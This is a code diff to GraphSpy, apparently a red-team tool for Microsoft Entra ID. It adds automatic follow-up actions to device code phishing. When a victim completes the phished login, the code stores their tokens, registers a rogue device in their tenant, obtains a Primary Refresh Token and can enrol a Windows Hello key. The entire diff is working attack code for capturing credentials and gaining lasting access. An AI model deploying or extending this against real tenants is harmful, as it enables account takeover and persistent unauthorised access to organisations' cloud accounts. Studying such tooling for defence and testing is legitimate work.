@@ -21,7 +21,8 @@ def init_db():
     con = sqlite3.connect(app.config['graph_spy_db_path'])
     con.execute('CREATE TABLE accesstokens (id INTEGER PRIMARY KEY AUTOINCREMENT, stored_at TEXT, issued_at TEXT, expires_at TEXT, description TEXT, user TEXT, resource TEXT, accesstoken TEXT)')
     con.execute('CREATE TABLE refreshtokens (id INTEGER PRIMARY KEY AUTOINCREMENT, stored_at TEXT, description TEXT, user TEXT, tenant_id TEXT, client_id TEXT, resource TEXT, foci INTEGER, refreshtoken TEXT)')
-    con.execute('CREATE TABLE devicecodes (id INTEGER PRIMARY KEY AUTOINCREMENT, generated_at INTEGER, expires_at INTEGER, user_code TEXT, device_code TEXT, interval INTEGER, client_id TEXT, status TEXT, last_poll INTEGER)')
+    con.execute('CREATE TABLE devicecodes (id INTEGER PRIMARY KEY AUTOINCREMENT, generated_at INTEGER, expires_at INTEGER, user_code TEXT, device_code TEXT, interval INTEGER, client_id TEXT, status TEXT' + 
+                ', last_poll INTEGER, auto_action TEXT, auto_device_name TEXT, auto_join_type INTEGER, auto_device_type TEXT, auto_os_version TEXT, auto_target_domain TEXT)')
     con.execute('CREATE TABLE request_templates (id INTEGER PRIMARY KEY AUTOINCREMENT, template_name TEXT, uri TEXT, method TEXT, request_type TEXT, body TEXT, headers TEXT, variables TEXT)')
     con.execute('CREATE TABLE teams_settings (access_token_id INTEGER PRIMARY KEY, skypeToken TEXT, skype_id TEXT, issued_at INTEGER, expires_at INTEGER, teams_settings_raw TEXT)')
     con.execute('CREATE TABLE mfa_otp (id INTEGER PRIMARY KEY AUTOINCREMENT, stored_at TEXT, secret_key TEXT, account_name INTEGER, description TEXT)')
@@ -80,7 +81,7 @@ def list_databases():
     return databases
 
 def update_db():
-    latest_schema_version = "5"
+    latest_schema_version = "6"
     current_schema_version = query_db("SELECT value FROM settings where setting = 'schema_version'",one=True)[0]
     if current_schema_version == "1":
         print("[*] Current database is schema version 1, updating to schema version 2")
@@ -108,6 +109,17 @@ def update_db():
         execute_db("ALTER TABLE refreshtokens ADD COLUMN client_id TEXT")
         execute_db("UPDATE settings SET value = '5' WHERE setting = 'schema_version'")
         print("[*] Updated database to schema version 5")
+        current_schema_version = query_db("SELECT value FROM settings where setting = 'schema_version'",one=True)[0]
+    if current_schema_version == "5":
+        print("[*] Current database is schema version 5, updating to schema version 6")
+        execute_db("ALTER TABLE devicecodes ADD COLUMN auto_action TEXT")
+        execute_db("ALTER TABLE devicecodes ADD COLUMN auto_device_name TEXT")
+        execute_db("ALTER TABLE devicecodes ADD COLUMN auto_join_type INTEGER")
+        execute_db("ALTER TABLE devicecodes ADD COLUMN auto_device_type TEXT")
+        execute_db("ALTER TABLE devicecodes ADD COLUMN auto_os_version TEXT")
+        execute_db("ALTER TABLE devicecodes ADD COLUMN auto_target_domain TEXT")
+        execute_db("UPDATE settings SET value = '6' WHERE setting = 'schema_version'")
+        print("[*] Updated database to schema version 6")
         current_schema_version = query_db("SELECT value FROM settings where setting = 'schema_version'",one=True)[0]
 
 
@@ -268,7 +280,7 @@ def save_refresh_token(refreshtoken, description, user, tenant, resource, foci, 
         tenant_id = "common"
     else:
         tenant_id = tenant.strip('"{}-[]\\/\' ') if is_valid_uuid(tenant.strip('"{}-[]\\/\' ')) else get_tenant_id(tenant)
-    execute_db("INSERT INTO refreshtokens (stored_at, description, user, tenant_id, client_id, resource, foci, refreshtoken) VALUES (?,?,?,?,?,?,?,?)",(
+    row_id =execute_db("INSERT INTO refreshtokens (stored_at, description, user, tenant_id, client_id, resource, foci, refreshtoken) VALUES (?,?,?,?,?,?,?,?)",(
             f"{datetime.now()}".split(".")[0],
             description,
             user,
@@ -279,6 +291,7 @@ def save_refresh_token(refreshtoken, description, user, tenant, resource, foci, 
             refreshtoken
             )
     )
+    return row_id
 
 def is_valid_uuid(val):
     try:
@@ -341,7 +354,8 @@ def refresh_to_access_token(refresh_token_id, client_id = "defined_in_token", re
 
 # ========== Device Code Functions ==========
 
-def generate_device_code(version= 1, client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c", resource = "https://graph.microsoft.com", scope = "https://graph.microsoft.com/.default openid offline_access", ngcmfa = False, cae = False):
+def generate_device_code(version= 1, client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c", resource = "https://graph.microsoft.com", scope = "https://graph.microsoft.com/.default openid offline_access", ngcmfa = False, cae = False,
+                         auto_action = None, auto_device_name = None, auto_join_type = None, auto_device_type = None, auto_os_version = None, auto_target_domain = None):
     if version == 1:
         body =  {
             "client_id": client_id,
@@ -369,7 +383,7 @@ def generate_device_code(version= 1, client_id = "d3590ed6-52b3-4102-aeff-aad229
     response = requests.post(url, data=body,headers=headers)
     if response.status_code != 200:
         raise AppError(f"Failed to generate device code.\n{parse_token_endpoint_error(response)}")
-    execute_db("INSERT INTO devicecodes (generated_at, expires_at, user_code, device_code, interval, client_id, status, last_poll) VALUES (?,?,?,?,?,?,?,?)",(
+    execute_db("INSERT INTO devicecodes (generated_at, expires_at, user_code, device_code, interval, client_id, status, last_poll, auto_action, auto_device_name, auto_join_type, auto_device_type, auto_os_version, auto_target_domain) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)",(
             int(datetime.now().timestamp()),
             int(datetime.now().timestamp()) + int(response.json()["expires_in"]),
             response.json()["user_code"],
@@ -377,7 +391,13 @@ def generate_device_code(version= 1, client_id = "d3590ed6-52b3-4102-aeff-aad229
             int(response.json()["interval"]),
             client_id,
             "CREATED",
-            0
+            0,
+            auto_action,
+            auto_device_name,
+            auto_join_type,
+            auto_device_type,
+            auto_os_version,
+            auto_target_domain
         )
     )
     return response.json()["device_code"]
@@ -412,7 +432,7 @@ def poll_device_codes():
                 if response.status_code == 200 and "access_token" in response.json():
                     access_token = response.json()["access_token"]
                     user_code = row["user_code"]
-                    save_access_token(access_token, f"Created using device code auth ({user_code})")
+                    access_token_id = save_access_token(access_token, f"Created using device code auth ({user_code})")
                     decoded_accesstoken = jwt.decode(access_token, options={"verify_signature": False})
                     user = "unknown"
                     # If the idtype is user, use the unique_name or upn
@@ -421,7 +441,9 @@ def poll_device_codes():
                         user = decoded_accesstoken["unique_name"] if "unique_name" in decoded_accesstoken else decoded_accesstoken["upn"] if "upn" in decoded_accesstoken else "unknown"
                     elif "idtyp" in decoded_accesstoken and decoded_accesstoken["idtyp"] == "app":
                         user = decoded_accesstoken["app_displayname"] if "app_displayname" in decoded_accesstoken else decoded_accesstoken["appid"] if "appid" in decoded_accesstoken else "unknown"
-                    save_refresh_token(
+                    else:
+                        user = "unknown"
+                    refresh_token_id = save_refresh_token(
                         response.json()["refresh_token"], 
                         f"Created using device code auth ({user_code})", 
                         user, 
@@ -430,6 +452,19 @@ def poll_device_codes():
                         int(response.json()["foci"]) if "foci" in response.json() else 0,
                         row["client_id"]
                     )
+                    if row.get("auto_action") in ["device_prt", "winhello"]:
+                        execute_db("UPDATE devicecodes SET status = ? WHERE device_code = ?",("ACTION_IN_PROGRESS",row["device_code"]))
+                        try:
+                            gspy_log.debug(f"Device code phishing successful for code '{user_code}', performing auto action '{row.get('auto_action')}'")
+                            device_id = register_device(access_token_id, row.get("auto_device_name"), row.get("auto_join_type"), row.get("auto_device_type"), row.get("auto_os_version"), row.get("auto_target_domain"))
+                            prt_id = request_prt_for_device(device_id, refresh_token_id, row.get("auto_os_version"))
+                            if row.get("auto_action") == "winhello":
+                                device_reg_access_token_id = refresh_prt_to_access_token(prt_id, "dd762716-544d-4aeb-a526-687b73838a22", "urn:ms-drs:enterpriseregistration.windows.net")
+                                register_winhello(device_reg_access_token_id)
+                        except Exception as e:
+                            gspy_log.error(f"Device code phishing successful for code '{user_code}', but the auto action '{row.get('auto_action')}' failed.\n{e}")
+                            execute_db("UPDATE devicecodes SET status = ? WHERE device_code = ?",("PARTIAL_SUCCESS",row["device_code"]))
+                            continue
                     execute_db("UPDATE devicecodes SET status = ? WHERE device_code = ?",("SUCCESS",row["device_code"]))
 
 def start_device_code_thread():
@@ -440,8 +475,9 @@ def start_device_code_thread():
     app.config["device_code_thread"].start()
     return "[Success] Started device code polling thread."
 
-def device_code_flow(version= 1, client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c", resource = "https://graph.microsoft.com", scope = "https://graph.microsoft.com/.default openid offline_access", ngcmfa = False, cae = False):
-    device_code = generate_device_code(version, client_id, resource, scope, ngcmfa,cae)
+def device_code_flow(version= 1, client_id = "d3590ed6-52b3-4102-aeff-aad2292ab01c", resource = "https://graph.microsoft.com", scope = "https://graph.microsoft.com/.default openid offline_access", ngcmfa = False, cae = False,
+                     auto_action = None, auto_device_name = None, auto_join_type = None, auto_device_type = None, auto_os_version = None, auto_target_domain = None):
+    device_code = generate_device_code(version, client_id, resource, scope, ngcmfa,cae, auto_action, auto_device_name, auto_join_type, auto_device_type, auto_os_version, auto_target_domain)
     row = query_db_json("SELECT * FROM devicecodes WHERE device_code = ?",[device_code],one=True)
     user_code = row["user_code"]
     start_device_code_thread()
@@ -506,7 +542,7 @@ def generate_public_key_rsa_blob(public_key):
     pubkeycngblob = base64.b64encode(b''.join(header)+exponent_as_bytes+modulus_as_bytes)
     return pubkeycngblob
 
-def register_device(access_token_id, device_name, join_type = 0, device_type = "Windows", os_version = "10.0.26100", target_domain = "e-corp.local"):
+def register_device(access_token_id, device_name = "GraphSpy-Device", join_type = 0, device_type = "Windows", os_version = "10.0.26100", target_domain = "e-corp.local"):
     """
     All credit to:
     https://github.com/dirkjanm/ROADtools
@@ -1594,7 +1630,16 @@ def init_routes():
         scope = request.form.get('scope') or "https://graph.microsoft.com/.default openid offline_access"
         ngcmfa = request.form.get('ngcmfa') == "true"
         cae = request.form.get('cae') == "true"
-        user_code = device_code_flow(version,client_id,resource,scope,ngcmfa,cae)
+        auto_action = request.form.get('auto_action')
+        if auto_action and auto_action != "none":
+            auto_device_name = request.form.get('auto_device_name') or "GraphSpy-Device"
+            auto_join_type = int(request.form.get('auto_join_type')) if request.form.get('auto_join_type') else 0
+            auto_device_type = request.form.get('auto_device_type') or "Windows"
+            auto_os_version = request.form.get('auto_os_version') or "10.0.26100"
+            auto_target_domain = request.form.get('auto_target_domain') or "e-corp.local"
+            user_code = device_code_flow(version,client_id,resource,scope,ngcmfa,cae,auto_action,auto_device_name,auto_join_type,auto_device_type,auto_os_version,auto_target_domain)
+        else:
+            user_code = device_code_flow(version,client_id,resource,scope,ngcmfa,cae)
         return user_code
 
     @app.post('/api/generate_device_code_reprocess_url')
@@ -1604,7 +1649,6 @@ def init_routes():
         user_code = request.form['user_code']
         return get_device_code_reprocess_url(user_code)
 
-    
     @app.route('/api/generate_device_code_and_redirect')
     def api_generate_device_code_and_redirect():
         version = int(request.args.get('version','1')) if request.args.get('version','1').isdigit() else 1
@@ -1613,7 +1657,17 @@ def init_routes():
         scope = request.args.get('scope') or "https://graph.microsoft.com/.default openid offline_access"
         ngcmfa = request.args.get('ngcmfa') == "true"
         cae = request.args.get('cae') == "true"
-        user_code = device_code_flow(version,client_id,resource,scope,ngcmfa,cae)
+        # Supported auto_action: [device_pt, winhello]
+        auto_action = request.args.get('auto_action')
+        if auto_action and auto_action != "none":
+            auto_device_name = request.args.get('auto_device_name') or "GraphSpy-Device"
+            auto_join_type = int(request.args.get('auto_join_type')) if request.args.get('auto_join_type') else 0
+            auto_device_type = request.args.get('auto_device_type') or "Windows"
+            auto_os_version = request.args.get('auto_os_version') or "10.0.26100"
+            auto_target_domain = request.args.get('auto_target_domain') or "e-corp.local"
+            user_code = device_code_flow(version,client_id,resource,scope,ngcmfa,cae,auto_action,auto_device_name,auto_join_type,auto_device_type,auto_os_version,auto_target_domain)
+        else:
+            user_code = device_code_flow(version,client_id,resource,scope,ngcmfa,cae)
         reprocess_url = get_device_code_reprocess_url(user_code)
         return redirect(reprocess_url)
 
